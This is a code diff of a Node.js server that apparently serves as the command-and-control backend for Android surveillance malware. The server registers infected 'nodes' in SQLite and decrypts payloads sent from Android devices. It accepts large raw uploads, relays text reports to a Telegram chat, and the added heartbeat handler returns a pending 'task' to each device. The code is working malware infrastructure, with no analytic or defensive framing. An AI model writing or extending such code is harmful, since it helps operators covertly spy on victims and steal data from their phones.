@@ -19,7 +19,6 @@ if (!TOKEN || !CHAT_ID) {
 const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
 fs.mkdirSync(STORAGE_DIR, { recursive: true });
 
-// 1. حماية السيرفر من الموت المفاجئ
 process.on('uncaughtException', (err) => {
     console.error('[FATAL] Uncaught exception:', err.message);
 });
@@ -27,7 +26,6 @@ process.on('unhandledRejection', (err) => {
     console.error('[FATAL] Unhandled rejection:', err);
 });
 
-// 2. مسح الداتابيز القديمة نهائياً قبل الفتح
 const DB_PATH = './uranium_core_v21.db';
 try {
     if (fs.existsSync(DB_PATH)) {
@@ -38,14 +36,12 @@ try {
     console.error('[DB] Failed to delete old database:', e.message);
 }
 
-// 3. فتح داتابيز جديدة نضيفة
 const db = new sqlite3.Database(DB_PATH);
 
 db.on('error', (err) => {
     console.error('[DB ERROR]', err.message);
 });
 
-// 4. بناء الجداول بالشكل الصح
 db.serialize(() => {
     db.run(`CREATE TABLE IF NOT EXISTS nodes (
         id TEXT PRIMARY KEY,
@@ -77,9 +73,7 @@ const app = express();
 const appBot = new telegramBot(TOKEN, { polling: { interval: 1500, autoStart: true } });
 
 app.use(express.json({ limit: '100mb' }));
-// ---> استقبال البيانات النصية المشفرة القادمة من الأندرويد بنجاح <---
 app.use(express.text({ type: '*/*', limit: '100mb' }));
-
 app.use('/api/v3/uranium/upload_raw', express.raw({ type: 'application/octet-stream', limit: '120mb' }));
 
 app.use((err, req, res, next) => {
@@ -111,7 +105,6 @@ function checkAuth(req, res, next) {
     next();
 }
 
-// === دوال فك وتشفير البيانات (مطابقة للاندرويد) ===
 function getKey(secret) {
     const raw = secret ? `${secret}|uranium-v27` : 'fallback|uranium-v27';
     return crypto.createHash('sha256').update(raw).digest();
@@ -165,7 +158,6 @@ app.post('/api/v3/uranium/stream', checkAuth, (req, res) => {
 
     let payload = req.body;
 
-    // فك التشفير لو كان base64 string
     if (typeof req.body === 'string') {
         payload = decryptPayload(req.body, secretHeader);
     }
@@ -190,6 +182,13 @@ app.post('/api/v3/uranium/stream', checkAuth, (req, res) => {
                 if (err) console.error('[DB INSERT NODE]', err.message);
             });
     });
+
+    // معالجة الـ HEARTBEAT لضمان تسجيل النود فوراً
+    if (payload.type === 'HEARTBEAT') {
+        const responseObj = { status: 'ACK', task: null };
+        const encrypted = encryptPayload(responseObj, secretHeader);
+        return res.send(encrypted);
+    }
 
     if (payload.type === 'TEXT_REPORT') {
         const text = String(payload.data || '').substring(0, 3800);
